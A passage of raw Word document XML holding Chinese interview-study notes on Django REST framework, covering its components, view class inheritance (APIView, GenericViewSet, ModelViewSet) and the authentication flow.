          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求头的不能对数据进行解析</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250EFD3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分页</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将从数据库获取到的数据在页面进行分页显示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B14A6D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还有其他组件：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A7C15FA" w14:textId="0655E504"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认证</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权限</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访问频率控制</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6462ABDB" w14:textId="489E86D6"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060</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 rest framework</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>框架中都有那些组件？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3867CF3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路由，自动帮助开发者快速为一个视图创建</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0184747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www.oldboyedu.com/api/v1/student/$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51743DF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www.oldboyedu.com/api/v1/student(?P&lt;format&gt;\w+)$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7379EC9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www.oldboyedu.com/api/v1/student/(?P&lt;pk&gt;\d+)/$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2775790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www.oldboyedu.com/api/v1/student/(?P&lt;pk&gt;\d+)(?P&lt;format&gt;\w+)$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B1C3A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版本处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EABFF5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问题：版本都可以放在那里？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47706BE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url</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE7491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GET </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49EBD39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请求头</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="772138B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认证</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5088F3A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问题：认证流程？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F7682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权限</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E63023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权限是否可以放在中间件中？以及为什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57581F3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访问频率的控制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB16B4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匿名用户可以真正的防止？无法做到真正的访问频率控制，只能把小白拒之门外。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="336D396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如果要封</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，使用防火墙来做。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0040815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登录用户可以通过用户名作为唯一标示进行控制，如果有人注册很多账号，则无法防止。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45AD797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视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B195B7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解析器</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，根据</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Content-Type</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求头对请求体中的数据格式进行处理。</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">request.data </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D6C3E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分页</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7826C01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序列化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A5567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序列化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF371D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source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C63380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 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>定义方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2569FBB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请求数据格式校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E479829" w14:textId="1A2F33BD"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渲染器</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388E7A21" w14:textId="0ED82602"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061</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 rest framework</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>框架中的视图都可以继承哪些类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF00B2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a. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>继承</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>APIView</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>（最原始）但定制性比较强</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE95FE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这个类属于</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>rest framework</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的顶层类，内部帮助我们实现了只是基本功能：认证、权限、频率控制，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27107D8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但凡是数据库、分页等操作都需要手动去完成，比较原始。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EAD6E4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class GenericAPIView(APIView)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6B79E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post(...):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C302E9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pass </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F774B7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E97D9F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b.</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>继承</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>GenericViewSet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ViewSetMixin</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generics.GenericAPIView</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4290E32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首先他的路由就发生变化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B67C2A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如果继承它之后，路由中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>as_view</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>需要填写对应关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66A49A2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在内部也帮助我们提供了一些方便的方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53BA973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get_queryset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3847288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get_object</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CEA112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get_serializer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA06CF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get_serializer_class</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5781263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get_serializer_context</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10A491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filter_queryset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="147C520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注意：要设置</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>queryset</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>字段，否则会抛出断言的异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0063BDB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0D721A4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代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D66045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只提供增加功能</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只继承</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>GenericViewSet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC20FF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8EBABA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class TestView(GenericViewSet):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2426258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serialazer_class = xxx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667A746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def creat(self,*args,**kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D13EE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 xml:space="preserve">pass  # </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>获取数据并对数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="306724C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7FFB69C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c. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>继承</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">  modelviewset  --&gt; </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>快速快发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B159C3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-ModelViewSet(</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>增删改查全有</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数据库操作</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3717726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-mixins.CreateModelMixin</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>（只有增）</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,GenericViewSet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="198CB3B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-mixins.CreateModelMixin,DestroyModelMixin,GenericViewSet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D6FBD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对数据库和分页等操作不用我们在编写，只需要继承相关类即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6389810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D282D1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示例：只提供增加功能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795741C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class TestView(mixins.CreateModelMixin,GenericViewSet):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2383F28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serializer_class = XXXXXXX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17FCAA9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60BDD6C1" w14:textId="43322B8D"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 xml:space="preserve">modelviewset --&gt; </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>快速开发，复杂点的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>genericview</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apiview</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE48CF1" w14:textId="75E786CE" w:rsidR="003942C2" w:rsidRDefault="003942C2" w:rsidP="003942C2">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
        <w:jc w:val="center"/>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153D5F49" wp14:editId="6AA5CE48">
            <wp:extent cx="6219825" cy="44767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9825" cy="4476750"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="73FFE9CA" w14:textId="1FE0AC4F" w:rsidR="003942C2" w:rsidRDefault="003942C2" w:rsidP="003942C2">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="196FDCD6" w14:textId="16746DE2"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062</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简述</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> django rest framework</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>框架的认证流程。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7377B4F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如何编写？写类并实现</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>authenticators</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52663C8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请求进来认证需要编写一个类，类里面有一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>authenticators</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法，我们可以自定义这个方法，可以定制</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类返回值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="372DB86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成功返回元组，返回</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>none</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>为匿名用户，抛出异常为认证失败。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70071BD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BC395D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源码流程：请求进来先走</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>dispatch</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法，然后封装的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象会执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>user</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法，由</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>user</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>触发</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>authenticators</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>认证流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7959373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方法中可以定义三种返回值：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA93E4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user,auth</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>），认证成功</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC82F0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None , </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>匿名用户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C1AAD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异常</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，认证失败</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C2C41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流程：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75EA11C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dispatch </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D31D5E" w14:textId="53DF46DF"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再去</w:t>
      </w:r>
